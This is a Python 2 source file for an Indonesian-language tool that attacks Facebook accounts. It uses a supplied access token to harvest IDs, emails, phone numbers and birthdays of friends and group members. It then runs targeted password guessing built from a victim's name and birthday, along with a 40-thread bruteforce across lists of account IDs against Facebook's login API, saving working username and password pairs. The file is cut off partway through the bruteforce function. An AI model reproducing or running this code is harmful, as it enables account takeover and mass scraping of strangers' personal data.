#!/usr/bin/python2
# coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

#-Setting-#
########
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]

#-failed-#
def failed():
	print "\033[1;91m[!] Exit"
	os.sys.exit()

#-Animation-#
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(00000.1)


##### LOGO #####
logo = """
\033[1;91m┌─────────────────────────────────────────────────────────────┐\033[1;91m
│ ▄▄▄▄▄▄                      █                    █          │\033[1;91m
│ █       ▄▄▄    ▄▄▄    ▄▄▄   █▄▄▄    ▄▄▄    ▄▄▄   █   ▄      │\033[1;91m
│ █▄▄▄▄▄ ▀   █  █▀  ▀  █▀  █  █▀ ▀█  █▀ ▀█  █▀ ▀█  █ ▄▀       │\033[1;91m
│ █      ▄▀▀▀█  █      █▀▀▀▀  █   █  █   █  █   █  █▀█        │\033[1;91m
│ █      ▀▄▄▀█  ▀█▄▄▀  ▀█▄▄▀  ██▄█▀  ▀█▄█▀  ▀█▄█▀  █  ▀▄      │\033[1;91m
└─────────────────────────────────────────────────────────────┘\033[1;91m

\033[1;93m•> \033[1;97mRecorde : \033[1;92mDIAN RIZKI PRATAMA                    
\033[1;93m•> \033[1;97mGithub : \033[1;35mgithub.com/yanhukumrimba
\033[1;93m•> \033[1;97mFB : \033[1;93mfb.com/Dian.Rizki.Pratama.DRP
\033[1;93m•> \033[1;97mIG : \033[1;92minstagram.com/yanhukumrimba
\033[1;93m•> \033[1;97mYT : \033[1;34myoutube.com/c/DianArt"""

# load #
def load():
	tiload = ['.   ','..  ','... ']
	for o in tiload:
		print("\r\033[1;91m[●] \033[1;92mProses \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"




##### choices Login #####
def tool_main_function():
	os.system('clear')
	print logo
	print "•-> \033[1;92m2.\033[1;97m LOGIN DENGAN TOKEN"
	print "•->\033[1;91m> \033[1;91m0.\033[1;97m KELUAR"
	login_method = raw_input("\033[1;91m>>> \033[1;97m")
	if login_method =="":
		print"\033[1;91m[!] Pilih Yang Benar"
		failed()
	elif login_method =="1":
		fbtoken()
	elif login_method =="0":
		failed()
	else:
		print"\033[1;91m[!] Salah"
		failed()

##### TOKEN #####
def fbtoken():
	os.system('clear')
	print logo
	fb_token = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
		a = json.loads(otw.text)
		fb_name = a['name']
		pick = open("login.txt", 'w')
		pick.write(fb_token)
		pick.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Pilih Yang Benar !!!"
		e = raw_input("\033[1;91m[?] \033[1;92mIngin mengambil token?\033[1;97m[y/n]: ")
		if e =="":
			failed()
		elif e =="y":
			login()
		else:
			failed()

##### MENU ##########################################
def menu():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
		a = json.loads(otw.text)
		fb_name = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91m[!] \033[1;93mAkun CP"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[!] tidak ada koneksi !!!"
		failed()
	os.system("reset")
	print logo
	print "•>\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Nama : \033[1;91m: \033[1;92m"+fb_name+"\033[1;97m"
	print "•>\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID : \033[1;91m: \033[1;92m"+id
	print "\033[1;97m•>\033[1;91m> \033[1;92m1.\033[1;97m Informasi Pengguna"
	print "\033[1;97m•>\033[1;91m> \033[1;92m2.\033[1;97m Dapatkan ID/Email/Hp"
	print "\033[1;97m•>\033[1;91m> \033[1;92m3.\033[1;97m Hack Akun FB"
	print "\033[1;97m•>\033[1;91m> \033[1;92m5.\033[1;97m Yang Lain"
	print "\033[1;97m•>\033[1;91m> \033[1;92m6.\033[1;97m Tampilkan Token"
	print "\033[1;97m•>\033[1;91m> \033[1;92m9.\033[1;97m Keluar"
	print "\033[1;97m•>\033[1;91m> \033[1;91m0.\033[1;97m Keluar Dari Progam"
	print "•>"
	choices()
#-
def choices():
	pick = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if pick =="":
		print "\033[1;91m[!] Salah !!!"
		choices()
	elif pick =="1":
		information()
	elif pick =="2":
		dump()
	elif pick =="3":
		menu_hack()
	elif pick =="4":
		lain()
		os.system('clear')
		print logo
		fb_token=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;92mToken Anda\033[1;91m :\033[1;97m "+fb_token
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		menu()
        elif pick =="7":
                os.system('clear')
                print logo
                print 40 * '\033[1;97m\xe2\x95\x90'
                os.system('git pull origin master')
                raw_input('\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]')
                menu()
	elif pick =="8":
		os.remove('out')
	elif pick =="9":
		os.system('rm -rf login.txt')
		os.system('xdg-open https://www.facebook.com/rizz.magizz')
		failed()
	elif pick =="0":
		failed()
	else:
		print "\033[1;91m[!] Salah !!!"
		choices()

##### INFO #####
def information():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token Tidak Ditemukan"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	aid = raw_input('\033[1;91m[+] \033[1;92mTekan Enter ID\033[1;97m/\033[1;92mNama\033[1;91m : \033[1;97m')
	jalan('\033[1;91m[✺] \033[1;92mTunggu Sebentar \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+fb_token)
			z = json.loads(x.text)
			print 42*"\033[1;97m═"
			try:
				print '\033[1;91m[➹] \033[1;92mNama\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mNama\033[1;97m          : \033[1;91mTidak Ditemukan'
			try:
				print '\033[1;91m[➹] \033[1;92mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mTidak Ditemukan'
			try:
				print '\033[1;91m[➹] \033[1;92mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mTidak Ditemukan'
			try:
				print '\033[1;91m[➹] \033[1;92mNo Hp\033[1;97m     : '+z['mobile_phone']
			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mTidak Ditemukan'
			try:
				print '\033[1;91m[➹] \033[1;92mLokasi\033[1;97m      : '+z['location']['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;97m      : \033[1;91mTidak Ditemukan'
			try:
				print '\033[1;91m[➹] \033[1;92mTanggal Lahir\033[1;97m : '+z['birthday']
			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mTidak Ditemukan'
			try:
				print '\033[1;91m[➹] \033[1;92mSekolah\033[1;97m        : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mTidak Ditemukan'
			except KeyError: pass
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			menu()
		else:
			pass
	else:
		print"\033[1;91m[✖] Pengguna Tidak Ditemukan"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		menu()

##### DUMP #####
def dump():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token Tidak Ditemukan"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m•>\033[1;91m> \033[1;92m1.\033[1;97m Dapatkan ID Teman"
	print "\033[1;97m•>\033[1;91m> \033[1;92m2.\033[1;97m Dapatkan ID Teman dari Teman"
	print "\033[1;97m•>\033[1;91m> \033[1;92m3.\033[1;97m Dapatkan ID Anggota Grup"
	print "\033[1;97m•>\033[1;91m> \033[1;91m0.\033[1;97m Kembali"
	print "•>"
	choose_dump()
#-----choices
def choose_dump():
	choose_from = raw_input("\033[1;97m•\033[1;91m> \033[1;97m")
	if choose_from =="":
		print "\033[1;91m[!] Pilih Yang Benar !!!"
		choose_dump()
	elif choose_from =="1":
		friends_id()
	elif choose_from =="2":
		id_from_friends()
	elif choose_from =="3":
		id_member_group()
	elif choose_from =="0":
		menu()
	else:
		print "\033[1;91m[!] Pilihan Salah !!!"
		choose_dump()

##### ID friends #####
def friends_id():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+fb_token)
		z=json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mDapatkan semua ID teman \033[1;97m...')
		print 42*"\033[1;97m═"
		make_action = open('out/friends_id.txt','w')
		for a in z['data']:
			idfriends.append(a['id'])
			make_action.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		make_action.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mBerhasil mendapatkan ID \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfriends))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan File dengan nama \033[1;91m :\033[1;97m ")
		os.rename('out/friends_id.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile Tersimpan \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada jaringan internet"
		failed()

##### ID FROM FRIENDS #####
def id_from_friends():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mMasukkan ID Teman \033[1;91m: \033[1;97m")
		try:
			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
			op = json.loads(seat.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDari\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Teman tidak tersedia"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+fb_token)
		z=json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mDapatkan semua id teman dari teman \033[1;97m...')
		print 42*"\033[1;97m═"
		make_action = open('out/friends_id_from_friends.txt','w')
		for a in z['friends']['data']:
			idfromfriends.append(a['id'])
			make_action.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		make_action.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mBerhasil mengambil ID \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromfriends))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan File dengan nama \033[1;91m :\033[1;97m ")
		os.rename('out/friends_id_from_friends.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile Tersimpan \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error membuat File"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stop")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada jaringan internet"
		failed()

##### ID FROM GROUP MEMBER #####
def id_member_group():
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDari group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group Tidak Tersedia"
			raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
			dump()
		jalan('\033[1;91m[✺] \033[1;92mDapatkan ID anggota grup \033[1;97m...')
		print 42*"\033[1;97m═"
		make_action = open('out/member_group.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999999&access_token='+fb_token)
		s=json.loads(re.text)
		for a in s['data']:
			member_id.append(a['id'])
			make_action.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(member_id))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		make_action.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSukses Mengambil ID \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(member_id))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan File dengan nama \033[1;91m :\033[1;97m ")
		os.rename('out/member_group.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile Tersimpan \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Salah !!!')
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi internet"
		failed()

##### MENU HACK #####
def menu_hack():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token tidak tersedia"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m•>\033[1;91m> \033[1;92m1.\033[1;97m Mini Hack FB(\033[1;92mTarget\033[1;97m)"
	print "\033[1;97m•>\033[1;91m> \033[1;92m2.\033[1;97m Multi Bruteforce FB"
	print "\033[1;97m•>\033[1;91m> \033[1;92m3.\033[1;97m Super Multi Bruteforce FB"
	print "\033[1;97m•>\033[1;91m> \033[1;92m4.\033[1;97m BruteForce(\033[1;92mTarget\033[1;97m)"
	print "\033[1;97m•>\033[1;91m> \033[1;91m0.\033[1;97m Keluar"
	print "║"
	choose_hack()
#----choices
def choose_hack():
	hack = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if hack=="":
		print "\033[1;91m[!] Salah !!!"
		choose_hack()
	elif hack =="1":
		mini()
	elif hack =="2":
		crack()
		success()
	elif hack =="3":
		super()
	elif hack =="4":
		brute()
	elif hack =="0":
		menu()
	else:
		print "\033[1;91m[!] Salah !!!"
		choose_hack()

##### MINI HF #####
def mini():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token tidak tersedia"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target Akun target harus teman\n       dengan akun anda terlebih dahulu !!!"
	print 42*"\033[1;97m═"
	try:
		id = raw_input("\033[1;91m[+] \033[1;92mTarget ID \033[1;91m:\033[1;97m ")
		jalan('\033[1;91m[✺] \033[1;92mTunggu Sebentar \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+id+"?access_token="+fb_token)
		a = json.loads(r.text)
		print '\033[1;91m[➹] \033[1;92mNama\033[1;97m : '+a['name']
		jalan('\033[1;91m[+] \033[1;92mMengecek \033[1;97m...')
		time.sleep(2)
		jalan('\033[1;91m[+] \033[1;92mBuka password \033[1;97m...')
		time.sleep(2)
		print 42*"\033[1;97m═"
		pz1 = a['first_name']+'123'
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		y = json.load(data)
		if 'access_token' in y:
			print "\033[1;91m[+] \033[1;92mFound"
			print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
			print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
			print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
			raw_input("\n\033[1;91m[ \033[1;97mkembali \033[1;91m]")
			menu_hack()
		else:
			if 'www.facebook.com' in y["error_msg"]:
				print "\033[1;91m[+] \033[1;92mFound"
				print "\033[1;91m[!] \033[1;93mAkun CP"
				print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
				print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
				print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
				raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
				menu_hack()
			else:
				pz2 = a['first_name'] + '12345'
				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				y = json.load(data)
				if 'access_token' in y:
					print "\033[1;91m[+] \033[1;92mFound"
					print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
					print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
					raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
					menu_hack()
				else:
					if 'www.facebook.com' in y["error_msg"]:
						print "\033[1;91m[+] \033[1;92mFound"
						print "\033[1;91m[!] \033[1;93mAkun CP"
						print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
						print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
						raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
						menu_hack()
					else:
						pz3 = a['last_name'] + '123'
						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
						y = json.load(data)
						if 'access_token' in y:
							print "\033[1;91m[+] \033[1;92mFound"
							print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
							print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
							raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
							menu_hack()
						else:
							if 'www.facebook.com' in y["error_msg"]:
								print "\033[1;91m[+] \033[1;92mFound"
								print "\033[1;91m[!] \033[1;93mAkun CP"
								print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
								print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
								raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
								menu_hack()
							else:
								lahir = a['birthday']
								pz4 = lahir.replace('/', '')
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								y = json.load(data)
								if 'access_token' in y:
									print "\033[1;91m[+] \033[1;92mFound"
									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
									print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
									raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
									menu_hack()
								else:
									if 'www.facebook.com' in y["error_msg"]:
										print "\033[1;91m[+] \033[1;92mFound"
										print "\033[1;91m[!] \033[1;93mAkun CP"
										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
										raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
										menu_hack()
									else:
										lahirs = a['birthday']
										gaz = lahirs.replace('/', '')
										pz5 = a['first_name']+gaz
										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
										y = json.load(data)
										if 'access_token' in y:
											print "\033[1;91m[+] \033[1;92mFound"
											print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
											print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
											raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
											menu_hack()
										else:
											if 'www.facebook.com' in y["error_msg"]:
												print "\033[1;91m[+] \033[1;92mFound"
												print "\033[1;91m[!] \033[1;93mAkun CP"
												print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
												print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
												raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
												menu_hack()
											else:
												pz6 = "bintang123"
												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
												y = json.load(data)
												if 'access_token' in y:
													print "\033[1;91m[+] \033[1;92mFound"
													print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
													print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
													raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
													menu_hack()
												else:
													if 'www.facebook.com' in y["error_msg"]:
														print "\033[1;91m[+] \033[1;92mFound"
														print "\033[1;91m[!] \033[1;93mAkun CP"
														print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
														print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
														raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
														menu_hack()
													else:
														pz7 = "sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia"
														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
														y = json.load(data)
														if 'access_token' in y:
															print "\033[1;91m[+] \033[1;92mFound"
															print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
															print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
															raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
															menu_hack()
														else:
															if 'www.facebook.com' in y["error_msg"]:
																print "\033[1;91m[+] \033[1;92mFound"
																print "\033[1;91m[!] \033[1;93mAkun CP"
																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;97m     : "+a['name']
																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
																raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
																menu_hack()
															else:
																print "\033[1;91m[!] Maaf, gagal membuka kata sandi target :("
																print "\033[1;91m[!] Coba lagi"
																raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
																menu_hack()
	except KeyError:
		print "\033[1;91m[!] Terget tidak tersedia"
		raw_input("\n\033[1;91m[ \033[1;97mKembali \033[1;91m]")
		menu_hack()


##### Multi Brute Force #####
##### CRACK ####
def crack():
	global idlist,passw,file
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
	passw = raw_input('\033[1;91m[+] \033[1;92mPassword \033[1;91m: \033[1;97m')
	try:
		file = open((idlist), "r")
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		for x in range(40):
			pick = threading.Thread(target=scrak, args=())
			pick.start()
			threads.append(pick)
		for pick in threads:
			pick.join()
	except IOError:
		print ("\033[1;91m[!] File not found")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_hack()

def scrak():
	global sucessful,checkpoint,action_failed,back,up
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		open_it = open(idlist, "r")
		up = open_it.read().split()
		while file:
			username = file.readline().strip()
			url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(passw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
			data = urllib.urlopen(url)
			mpsh = json.load(data)
			if back == (len(up)):
				break
			if 'access_token' in mpsh:
				bisa = open("out/mbf_ok.txt", "w")
				bisa.write(username+"|"+passw+"\n")
				bisa.close()
